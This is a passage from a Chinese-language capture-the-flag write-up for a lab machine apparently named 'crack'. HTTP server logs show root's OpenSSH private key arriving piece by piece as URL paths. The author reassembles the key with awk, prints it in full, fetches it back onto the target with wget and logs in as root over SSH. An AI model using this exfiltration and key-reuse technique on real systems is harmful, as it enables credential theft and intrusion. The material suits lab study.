192.168.205.143 - - [23/Jan/2025 16:19:48] "GET //RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /-----END HTTP/1.1" 404 -

```

我们提取一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat tmp 
┌──(kali㉿kali)-[~/test]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /randomfile1 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /frand2 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /-----BEGIN HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET //+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/ HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET //RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /-----END HTTP/1.1" 404 -

                                                                     
┌──(kali㉿kali)-[~/test]
└─$ awk -F 'GET /' '{print $2}' tmp | awk -F ' HTTP/1.1' '{print $1}' | grep -v '^\s*$'
randomfile1
frand2
-----BEGIN
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
s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s=
-----END
                                                            
```

尽力了，自己再编辑一下吧

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s=
-----END OPENSSH PRIVATE KEY-----

```

传过去试试

```bash
cris@crack:~$ cd /tmp/                                                                                                                                                                       
cris@crack:/tmp$ wget 192.168.205.141/id_rsa                                                                                                                                                 
--2025-01-23 09:32:12--  http://192.168.205.141/id_rsa                                                                                                                                       
Conectando con 192.168.205.141:80... conectado.                                                                                                                                              
PeticiÃ³n HTTP enviada, esperando respuesta... 200 OK                                                                                                                                         
Longitud: 2590 (2,5K) [application/octet-stream]                                                                                                                                             
Grabando a: Â«id_rsaÂ»                                                                                                                                                                         
                                                                                                                                                                                             
id_rsa                                          100%[======================================================================================================>]   2,53K  --.-KB/s    en 0s     
                                                                                                                                                                                             
2025-01-23 09:32:12 (427 MB/s) - Â«id_rsaÂ» guardado [2590/2590]                                                                                                                               
                                                                                                                                                                                             
cris@crack:/tmp$ chmod 600 id_rsa                                                                                                                                                            
cris@crack:/tmp$ ssh root@127.0.0.1 -i id_rsa                                                                                                                                                
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.                                                                                                                       
ECDSA key fingerprint is SHA256:7z5F9pr6GN7gcEMbKUwipxWswKEpR9bMKOVzGc0V7/s.                                                                                                                 
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                                                                                                     
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.                                                                                                                   
Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64                                                                                                                     
                                                                                                                                                                                             
The programs included with the Debian GNU/Linux system are free software;                                                                                                                    
the exact distribution terms for each program are described in the                                                                                                                           
individual files in /usr/share/doc/*/copyright.                                                                                                                                              
                                                                                                                                                                                             
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                                                                                                            
permitted by applicable law.                                                                                                                                                                 
Last login: Wed Jun  7 22:11:49 2023                                                                                                                                                         
root@crack:~# id                                                                                                                                                                             
uid=0(root) gid=0(root) grupos=0(root)                                                                                                                                                       
```